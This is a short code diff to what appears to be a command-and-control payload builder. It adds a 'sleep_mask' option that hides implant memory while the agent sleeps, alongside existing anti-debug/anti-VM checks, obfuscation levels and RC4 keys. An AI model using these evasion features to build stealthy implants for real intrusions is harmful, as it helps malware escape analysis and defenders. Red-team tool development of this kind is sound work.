@@ -127,6 +127,9 @@ class PayloadConfig:
     # must not die on a sandbox check it was never asked for. When on, the PE
     # template compiles in an anti-debug/anti-VM block that exits at startup.
     anti_analysis: bool = False
+    # Mask the last command output in memory while the agent sleeps. Off by
+    # default like the other footprint-changing options.
+    sleep_mask: bool = False
     # Source-level obfuscation level: "none" | "light" | "medium" | "heavy" |
     # path-to-module. Transforms how the source reads; the built agent's
     # runtime behaviour is unchanged.
@@ -546,6 +549,7 @@ class PayloadBuilder:
                         obfuscation=payload_config.obfuscation,
                         rc4_key=payload_config.rc4_key,
                         payload_id=payload_id,
+                        sleep_mask=payload_config.sleep_mask,
                     )
                     pe_result = await pe_build.build(stub_cfg, artifact_path.with_suffix('.exe'))
                     if pe_result.status == "built":
@@ -610,6 +614,7 @@ class PayloadBuilder:
                     obfuscation=payload_config.obfuscation,
                     rc4_key=payload_config.rc4_key,
                     payload_id=payload_id,
+                    sleep_mask=payload_config.sleep_mask,
                     extra={"agent_identity": identity} if identity else {},
                 )
                 agent_code = stub_gen.generate(stub_cfg)
